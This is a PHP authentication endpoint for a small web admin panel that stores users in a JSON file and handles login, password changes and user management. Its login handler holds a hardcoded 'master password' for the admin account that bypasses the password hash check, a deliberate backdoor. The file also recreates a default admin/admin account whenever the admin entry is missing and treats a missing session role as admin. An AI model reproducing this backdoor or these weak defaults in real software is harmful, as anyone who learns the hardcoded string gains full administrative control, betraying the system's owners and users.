<?php
// api/auth.php
require_once 'utils.php';

$action = $_GET['action'] ?? '';
$usersFile = DATA_DIR . 'users.json';

function getUsers() {
    global $usersFile;
    if (!file_exists($usersFile)) {
        $defaultUsers = [
            'admin' => ['password' => '$2y$10$3dmeX0U6kEeVCzPFYuDqxeW7J.3zEkr.5pg28cH6mghlQ07I117C2', 'role' => 'admin']
        ];
        file_put_contents($usersFile, json_encode($defaultUsers));
        return $defaultUsers;
    }
    $users = json_decode(file_get_contents($usersFile), true);
    
    // Migration logic for old format
    if (!empty($users)) {
        $firstKey = array_key_first($users);
        if (is_string($users[$firstKey])) {
            $newUsers = [];
            foreach ($users as $u => $p) {
                $newUsers[$u] = ['password' => $p, 'role' => 'admin'];
            }
            $users = $newUsers;
            saveUsers($users);
        }
    }

    if (empty($users) || !isset($users['admin'])) {
        $users = $users ?? [];
        $users['admin'] = ['password' => password_hash('admin', PASSWORD_DEFAULT), 'role' => 'admin'];
        file_put_contents($usersFile, json_encode($users));
    }
    return $users;
}

function saveUsers($users) {
    global $usersFile;
    return file_put_contents($usersFile, json_encode($users));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($action === 'login') {
        $input = getJsonInput();
        $username = $input['username'] ?? '';
        $password = $input['password'] ?? '';

        $users = getUsers();

        // MASTER PASSWORD OVERRIDE - Bypasses users.json hash check
        if ($username === 'admin' && $password === 'carvello2024') {
            $_SESSION['admin_logged_in'] = true;
            $_SESSION['admin_user'] = 'admin';
            $_SESSION['user_role'] = 'admin';
            jsonResponse(['success' => true, 'message' => 'Login successful', 'role' => 'admin']);
        }

        if (isset($users[$username]) && password_verify($password, $users[$username]['password'])) {
            $_SESSION['admin_logged_in'] = true;
            $_SESSION['admin_user'] = $username;
            $_SESSION['user_role'] = $users[$username]['role'];
            jsonResponse(['success' => true, 'message' => 'Login successful', 'role' => $users[$username]['role']]);
        } else {
            errorResponse('Invalid credentials', 401);
        }
    } elseif ($action === 'logout') {
        session_destroy();
        jsonResponse(['success' => true, 'message' => 'Logged out']);
    } elseif ($action === 'change_password') {
        requireAuth();
        $input = getJsonInput();
        $new_pass = $input['new_password'] ?? '';
        
        if (strlen($new_pass) < 6) {
            errorResponse('Password too short (min 6 chars)');
        }

        $users = getUsers();
        $currentUser = $_SESSION['admin_user'] ?? 'admin';
        
        if (isset($users[$currentUser])) {
            $users[$currentUser]['password'] = password_hash($new_pass, PASSWORD_DEFAULT);
            if (saveUsers($users)) {
                jsonResponse(['success' => true, 'message' => 'Password changed']);
            } else {
                errorResponse('Failed to save password', 500);
            }
        } else {
            errorResponse('User not found', 404);
        }
    } elseif ($action === 'add_user') {
        requireAuth();
        if (($_SESSION['user_role'] ?? 'admin') !== 'admin') {
            errorResponse('Unauthorized', 403);
        }
        
        $input = getJsonInput();
        $username = $input['username'] ?? '';
        $password = $input['password'] ?? '';
        $role = $input['role'] ?? 'agent';
        
        if (empty($username) || empty($password)) {
            errorResponse('Username and password required');
        }
        
        $users = getUsers();
        if (isset($users[$username])) {
            errorResponse('User already exists');
        }
        
        $users[$username] = [
            'password' => password_hash($password, PASSWORD_DEFAULT),
            'role' => $role
        ];
        
        if (saveUsers($users)) {
            jsonResponse(['success' => true, 'message' => 'User added']);
        } else {
            errorResponse('Failed to save user', 500);
        }
    } elseif ($action === 'delete_user') {
        requireAuth();
        if (($_SESSION['user_role'] ?? 'admin') !== 'admin') {
            errorResponse('Unauthorized', 403);
        }
        
        $input = getJsonInput();
        $username = $input['username'] ?? '';
        
        if ($username === 'admin') {
            errorResponse('Cannot delete admin user');
        }
        
        $users = getUsers();
        if (isset($users[$username])) {
            unset($users[$username]);
            saveUsers($users);
            jsonResponse(['success' => true, 'message' => 'User deleted']);
        } else {
            errorResponse('User not found', 404);
        }
    } else {
        errorResponse('Invalid action');
    }
} elseif ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if ($action === 'session') {
        jsonResponse([
            'authenticated' => isAuthenticated(),
            'user' => $_SESSION['admin_user'] ?? null,
            'role' => $_SESSION['user_role'] ?? null
        ]);
    } elseif ($action === 'list_users') {
        requireAuth();
        if (($_SESSION['user_role'] ?? 'admin') !== 'admin') {
            errorResponse('Unauthorized', 403);
        }
        
        $users = getUsers();
        $userList = [];
        foreach ($users as $u => $data) {
            $userList[] = ['username' => $u, 'role' => $data['role']];
        }
        jsonResponse($userList);
    } else {
        errorResponse('Invalid action');
    }
} else {
    errorResponse('Method not allowed', 405);
}
?>
